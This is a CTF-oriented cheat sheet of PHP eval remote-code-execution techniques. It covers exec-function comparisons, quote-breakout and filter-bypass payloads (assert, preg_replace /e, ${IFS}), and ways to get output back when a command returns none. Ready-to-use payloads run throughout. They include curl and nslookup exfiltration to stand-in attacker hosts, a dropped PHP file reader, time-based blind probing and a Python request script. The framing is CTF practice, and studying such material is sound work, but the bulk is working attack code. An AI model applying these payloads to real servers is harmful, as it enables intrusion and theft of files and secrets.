# eval With RCE Techniques Collection

## PHP Code execution function comparison

| Functions | Echo | Usage |
|------|------|------|
| `system($cmd)` | **Yes**(directly output to stdout) | `system("id")` → Results are seen directly on the page |
| `passthru($cmd)` | **Yes**(Original binary output) | `passthru("cat flag.php")` |
| `exec($cmd, $out)` | **None**(Stored in `$out` Array) | `exec("id", $out); print_r($out)` |
| `shell_exec($cmd)` | **None**(Return string) | `echo shell_exec("id")` |
| `` `$cmd` `` | **None**(equivalent to. shell_exec) | `` echo `id` `` |
| `popen($cmd, 'r')` | **None**(must fread) | `$h=popen("id","r");echo fread($h,1024)` |
| `eval($code)` | depends on code | `eval("system('id');")` → There is an echo |

## highlight_file and eval Output order

This is CTF Common pitfalls:

```php
<?php
highlight_file(__FILE__);
eval($_GET['cmd']);
?>
```

**Key understanding**:
- `highlight_file()` Output source code highlighting → This is the first step
- `eval()` in `system()` output → This is the second step
- both in**same one HTTP response**, the command results are highlighted in the source code**after**
- `system()` The output is written directly to stdout of,**will not be highlight_file "block"**

**search flag method**:
- exist HTTP responsive**end**Find flag
- `highlight_file` of HTML The output is very long,flag usually at the end
- use `python_execute` Parse the response, looking only at the last few hundred characters

```python
import requests
r = requests.get(url, params={"cmd": "system('cat flag.php');"})
# flag exist r.text at the end, not in the highlighted part of the source code
print(r.text[-500:])  # Just watch the end 500 character
```

## eval Bypass tricks

### 1. semicolon bypass

```php
// if eval Semicolon is required but input is filtered
eval($_GET['cmd']);  // normal usage
// incoming: system('id')  // No need to add a semicolon,eval will be added automatically
// or pass in: system('id');// 
```

### 2. PHP closing tag

```php
// if eval Content is wrapped
eval("echo '" . $_GET['cmd'] . "';");
// incoming: ');system('id');//
// result: eval("echo '');system('id');//';");
```

### 3. assert() injection

```php
// assert() exist PHP 7 Code can be executed before
assert("system('id')");  // PHP < 7.x
// PHP 7+ assert Becomes a language structure and no longer executes strings
```

### 4. preg_replace /e modifier

```php
// PHP < 7.0 of preg_replace /e The replacement result will be executed
preg_replace('/test/e', 'system("id")', 'test');
// arbitrary regular + /e + Controllable replacement string → RCE
```

## No echo RCE use

### method 1:Write files to Web Table of contents
```bash
system("cat flag.php > /var/www/html/x.txt");
# Then visit http://target/x.txt
```

### method 2:DNS/HTTP Takeaway
```bash
system("curl http://your-server/$(cat flag.php | base64)");
system("nslookup $(cat flag.php).your-server.com");
```

### method 3: write PHP Read file again
```bash
system("echo '<?php echo file_get_contents(\"/flag\"); ?>' > /var/www/html/read.php");
# Then visit http://target/read.php
```

### method 4:Environment variables + another vulnerability
```bash
# write result cookie/session
system("export FLAG=$(cat flag.php)");
# pass phpinfo() or /proc/self/environ read
```

## PHP Code execution chain construction

### Exploitation chain from simple to complex

1. **Direct execution**:`system("id")` → There is an echo
2. **Write file without echo**:`system("cat flag.php > /var/www/html/x")`
3. **No echo takeaway**:`system("curl http://evil/$(cat flag.php)")`
4. **No echo blind**:`system("if [ $(cat flag.php | head -c1) = N ]; then sleep 3; fi")`

### common CTF eval scene

| scene | code pattern | Bypass method |
|------|---------|---------|
| Simple eval | `eval($_GET['cmd'])` | `system('cat flag.php')` |
| eval + filter spaces | `eval($cmd)` + spaces are replaced | `system('cat${IFS}flag.php')` |
| eval + filter keywords | `eval($cmd)` + flag replaced | `system('cat${IFS}/f*')` |
| eval + highlight_file | `highlight_file + eval` | look**end of page** |
| eval + length limit | `strlen($cmd) > N` | use variables/short function name |
| assert injection | `assert($_GET['cmd'])` | PHP < 7: `system('id')` |
| preg_replace /e | `preg_replace('/./e', ...)` | Inject code into replacement string |
